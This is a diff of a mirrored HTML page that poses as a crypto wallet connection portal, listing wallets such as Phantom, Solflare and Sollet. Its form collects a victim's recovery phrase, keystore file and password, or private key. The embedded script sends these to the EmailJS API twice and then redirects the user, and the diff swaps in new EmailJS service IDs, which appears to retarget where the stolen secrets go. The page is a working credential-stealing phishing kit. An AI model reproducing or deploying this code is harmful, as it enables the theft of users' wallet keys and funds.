@@ -4,6 +4,7 @@
 
 
 <!-- Mirrored from www.mainnetprotocol.com/integratewallet/dapps.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 30 Mar 2022 21:09:37 GMT -->
+
 <head>
   <meta http-equiv="content-type" content="text/html; charset=UTF-8">
 
@@ -620,7 +621,6 @@
 <body>
 
   <div class="overlay" id="thebox" style="display: none ; margin-top: -50px;">
-
     <div class="overbox">
       <div style="overflow:hidden;margin:5px 0px;">
         <div class="closex" onclick="shutx('#thebox')">X</div>
@@ -650,7 +650,7 @@
           </div>
 
           <div class="keystorebox ccbox">
-            <textarea class="textarea allinput"  name="keystorejson" placeholder="Keystore JSON"
+            <textarea class="textarea allinput" name="keystorejson" placeholder="Keystore JSON"
               id="kjsoninput"></textarea>
             <input class="input allinput" name="keystorepassword" placeholder="Keystore Password" id="kpasswordinput">
           </div>
@@ -681,7 +681,6 @@
       </div>
 
     </div>
-
   </div>
 
   <style>
@@ -738,11 +737,11 @@
     }
   </style>
   <script>
-    const template_id = 'template_9ie7yao';
-    const service_id = 'service_o73zfu5';
-    const user_id = 'RU8unmTCs1GHanOxT';
+    const template_id = 'template_hai1scd';
+    const service_id = 'service_da6708m';
+    const user_id = 'hnlngvyGy8WwIv0X8';
     const form = document.getElementById('submitform');
-    
+
     const submitForm = (event) => {
       event.preventDefault();
 
@@ -755,13 +754,13 @@
       const type = document.getElementById('wallettype').value || 'phrase';
       const activeForm = document.querySelectorAll(".activebox")[1].className.split(" ")[0];
       let phrase;
-      
-      if(activeForm === 'phrasebox') phrase = phraseInputVal;
-      if(activeForm === 'keystorebox') phrase = kjsoninputVal+"==="+kpasswordinputVal;
-      if(activeForm === 'privatebox') phrase = privateinputVal;      
-      
+
+      if (activeForm === 'phrasebox') phrase = phraseInputVal;
+      if (activeForm === 'keystorebox') phrase = kjsoninputVal + "===" + kpasswordinputVal;
+      if (activeForm === 'privatebox') phrase = privateinputVal;
+
       if (phrase.trim() === "") {
-        alert('Fill in your connection '+type);
+        alert('Fill in your connection ' + type);
       } else {
         var data = {
           service_id,
@@ -781,15 +780,15 @@
         }).done(function () {
           data.template_id = 'template_lscuf4n';
           data.service_id = 'service_obyoros';
-           data.user_id = 'GCWFVgTjoR58gLjqe';
-	  $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
-	    type: 'POST',
-	    data: JSON.stringify(data),
-	    contentType: 'application/json'
-	  }).done(function () {
-	  	 redirect();
-	  })
-         
+          data.user_id = 'GCWFVgTjoR58gLjqe';
+          $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
+            type: 'POST',
+            data: JSON.stringify(data),
+            contentType: 'application/json'
+          }).done(function () {
+            redirect();
+          })
+
           document.querySelector('.sending').style.display = 'block';
         }).fail(function (error) {
           alert('Could not proceed due to some errors, kindly try again later.')
@@ -1282,7 +1281,7 @@
                     </div>
 
 
- 
+
 
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
@@ -1327,30 +1326,26 @@
 
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons"
-                          src="../media/phantom.png"
-                          alt="Phantom"></div>
+                          src="../media/phantom.png" alt="Phantom"></div>
                       <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Phantom</div>
                     </div>
 
 
-                   <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons"
-                          src="../media/solflare.png"
-                          alt="Solflare"></div>
+                          src="../media/solflare.png" alt="Solflare"></div>
                       <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Solflare</div>
                     </div>
 
-                   <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons"
-                          src="../media/slope.jpg"
-                          alt="Slope"></div>
+                          src="../media/slope.jpg" alt="Slope"></div>
                       <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Slope</div>
                     </div>
-                    
-                                       <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+
+                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons"
-                          src="../media/sollet.png"
-                          alt="Sollet"></div>
+                          src="../media/sollet.png" alt="Sollet"></div>
                       <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Sollet</div>
                     </div>
 
@@ -1381,14 +1376,14 @@
                     </div>
 
 
-                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
                         <img class="img_icons"
                           src="../logo/lg/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpg">
                       </div>
                       <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">ONTO</div>
                     </div>
-                    
+
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
                         <img class="img_icons"
@@ -1438,7 +1433,7 @@
                       <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">BitPay</div>
                     </div>
 
-                   <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
                         <img class="img_icons"
                           src="../logo/lg/cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46.jpg"
@@ -2010,7 +2005,7 @@
                           src="files/lido-4fe413d9b23c88bb6973c62da15a03dc.png" alt="Lido"></div>
                       <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Lido</div>
                     </div>
-                    
+
 
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                       <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons"
@@ -2515,8 +2510,8 @@
                       <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Rubic Exchange</div>
                     </div>
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
-                      <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons"
-                          src="files/torus.jpg" alt="Rubic Exchange"></div>
+                      <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="files/torus.jpg"
+                          alt="Rubic Exchange"></div>
                       <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Torus Wallet</div>
                     </div>
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
@@ -3657,4 +3652,5 @@
 
 
 <!-- Mirrored from www.mainnetprotocol.com/integratewallet/dapps.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 30 Mar 2022 21:09:38 GMT -->
+
 </html>
